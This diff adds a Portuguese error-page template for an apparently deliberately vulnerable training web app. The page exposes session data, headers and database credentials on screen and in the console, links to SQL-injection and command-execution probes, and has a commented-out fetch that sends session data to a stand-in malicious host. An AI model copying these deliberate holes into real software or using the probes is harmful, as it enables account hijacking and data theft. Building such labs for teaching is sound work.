@@ -1,0 +1,200 @@
+{% extends "base.html" %}
+
+{% block title %}Erro {{ error_code }} - Vulnerable Sales Dashboard{% endblock %}
+
+{% block content %}
+<div class="row mb-4">
+    <div class="col-12">
+        <h1 class="text-danger"><i class="fas fa-exclamation-triangle"></i> Erro {{ error_code }}</h1>
+        <p class="lead">{{ error_message }}</p>
+    </div>
+</div>
+
+<!-- Error Information Exposure -->
+<div class="alert alert-danger">
+    <i class="fas fa-bug"></i>
+    <strong>VULNERABILIDADE:</strong> 
+    Esta página de erro expõe informações sensíveis que deveriam ser ocultadas em produção!
+</div>
+
+<div class="row">
+    <div class="col-md-6">
+        <div class="card border-danger">
+            <div class="card-header bg-danger text-white">
+                <h5><i class="fas fa-info-circle"></i> Detalhes da Requisição</h5>
+            </div>
+            <div class="card-body">
+                <table class="table table-sm">
+                    <tr>
+                        <td><strong>URL:</strong></td>
+                        <td><code>{{ debug_info.url }}</code></td>
+                    </tr>
+                    <tr>
+                        <td><strong>Método:</strong></td>
+                        <td><span class="badge bg-primary">{{ debug_info.method }}</span></td>
+                    </tr>
+                    <tr>
+                        <td><strong>Timestamp:</strong></td>
+                        <td>{{ moment().format('DD/MM/YYYY HH:mm:ss') if moment else 'N/A' }}</td>
+                    </tr>
+                </table>
+            </div>
+        </div>
+        
+        <div class="card border-warning mt-3">
+            <div class="card-header bg-warning">
+                <h5><i class="fas fa-user-secret"></i> Dados da Sessão Expostos</h5>
+            </div>
+            <div class="card-body">
+                <pre class="bg-light p-3 rounded">{{ debug_info.session | tojson(indent=2) }}</pre>
+                
+                <div class="alert alert-warning mt-3">
+                    <small>
+                        <i class="fas fa-exclamation-triangle"></i>
+                        <strong>Risco:</strong> Informações de sessão expostas podem permitir sequestro de conta!
+                    </small>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <div class="col-md-6">
+        <div class="card border-info">
+            <div class="card-header bg-info text-white">
+                <h5><i class="fas fa-globe"></i> Headers HTTP</h5>
+            </div>
+            <div class="card-body">
+                <div style="max-height: 300px; overflow-y: auto;">
+                    <pre class="bg-light p-3 rounded small">{{ debug_info.headers | tojson(indent=2) }}</pre>
+                </div>
+            </div>
+        </div>
+        
+        {% if debug_info.database_url %}
+        <div class="card border-danger mt-3">
+            <div class="card-header bg-danger text-white">
+                <h5><i class="fas fa-database"></i> Configuração do Banco</h5>
+            </div>
+            <div class="card-body">
+                <p><strong>URL do Banco:</strong></p>
+                <code class="text-danger">{{ debug_info.database_url }}</code>
+                
+                <div class="alert alert-danger mt-3">
+                    <small>
+                        <i class="fas fa-skull-crossbones"></i>
+                        <strong>CRÍTICO:</strong> Credenciais do banco de dados expostas!
+                    </small>
+                </div>
+            </div>
+        </div>
+        {% endif %}
+    </div>
+</div>
+
+<!-- Common Error Scenarios -->
+<div class="row mt-4">
+    <div class="col-12">
+        <div class="card">
+            <div class="card-header">
+                <h5><i class="fas fa-list"></i> Cenários de Erro Comuns</h5>
+            </div>
+            <div class="card-body">
+                <div class="row">
+                    <div class="col-md-4">
+                        <h6>Erro 404 - Não Encontrado:</h6>
+                        <ul class="list-unstyled small">
+                            <li><a href="/nonexistent" class="text-danger">Página inexistente</a></li>
+                            <li><a href="/user/999" class="text-danger">Usuário inexistente</a></li>
+                            <li><a href="/order/999" class="text-danger">Pedido inexistente</a></li>
+                        </ul>
+                    </div>
+                    
+                    <div class="col-md-4">
+                        <h6>Erro 500 - Servidor:</h6>
+                        <ul class="list-unstyled small">
+                            <li><a href="/api/search_users?q='" class="text-danger">SQL Injection</a></li>
+                            <li><a href="/api/read_file?file=/invalid" class="text-danger">Arquivo inválido</a></li>
+                            <li><a href="/api/execute_command?cmd=invalid" class="text-danger">Comando inválido</a></li>
+                        </ul>
+                    </div>
+                    
+                    <div class="col-md-4">
+                        <h6>Informações Expostas:</h6>
+                        <ul class="list-unstyled small text-warning">
+                            <li><i class="fas fa-bug"></i> Estrutura de diretórios</li>
+                            <li><i class="fas fa-bug"></i> Versões de software</li>
+                            <li><i class="fas fa-bug"></i> Configurações internas</li>
+                            <li><i class="fas fa-bug"></i> Dados de sessão</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- Navigation -->
+<div class="row mt-4">
+    <div class="col-12 text-center">
+        <a href="{{ url_for('dashboard') }}" class="btn btn-primary">
+            <i class="fas fa-home"></i> Voltar ao Dashboard
+        </a>
+        <a href="{{ url_for('login') }}" class="btn btn-secondary">
+            <i class="fas fa-sign-in-alt"></i> Fazer Login
+        </a>
+        <a href="/debug" class="btn btn-danger">
+            <i class="fas fa-bug"></i> Ver Debug (Vulnerável)
+        </a>
+    </div>
+</div>
+
+{% endblock %}
+
+{% block extra_js %}
+<script>
+// Log error information to console (information disclosure)
+console.log('=== INFORMAÇÕES DE ERRO EXPOSTAS ===');
+console.log('Error Code:', {{ error_code }});
+console.log('Error Message:', '{{ error_message }}');
+console.log('Request URL:', '{{ debug_info.url }}');
+console.log('Request Method:', '{{ debug_info.method }}');
+console.log('Session Data:', '{{ debug_info.session | tojson }}');
+console.log('Headers:', '{{ debug_info.headers | tojson }}');
+
+{% if debug_info.database_url %}
+console.log('Database URL (EXPOSED):', '{{ debug_info.database_url }}');
+{% endif %}
+
+// Simulate error tracking that exposes sensitive data
+function trackError() {
+    const errorData = {
+        error_code: '{{ error_code }}',
+        error_message: '{{ error_message }}',
+        url: '{{ debug_info.url }}',
+        method: '{{ debug_info.method }}',
+        session: '{{ debug_info.session | tojson }}',
+        headers: '{{ debug_info.headers | tojson }}',
+        timestamp: new Date().toISOString(),
+        user_agent: navigator.userAgent,
+        screen_resolution: screen.width + 'x' + screen.height
+    };
+    
+    console.log('Error tracking data (would be sent to external service):', errorData);
+    
+    // In a real vulnerable app, this might send data to external servers
+    // fetch('https://malicious-tracking.com/errors', { method: 'POST', body: JSON.stringify(errorData) });
+}
+
+// Auto-execute error tracking
+setTimeout(trackError, 1000);
+
+// Demonstrate session hijacking possibility
+{% if debug_info.session.user_id %}
+console.log('VULNERABILIDADE: Possível sequestro de sessão detectado!');
+console.log('User ID exposto:', '{{ debug_info.session.user_id }}');
+console.log('Username exposto:', '{{ debug_info.session.username }}');
+console.log('Role exposto:', '{{ debug_info.session.role }}');
+{% endif %}
+</script>
+{% endblock %}
+
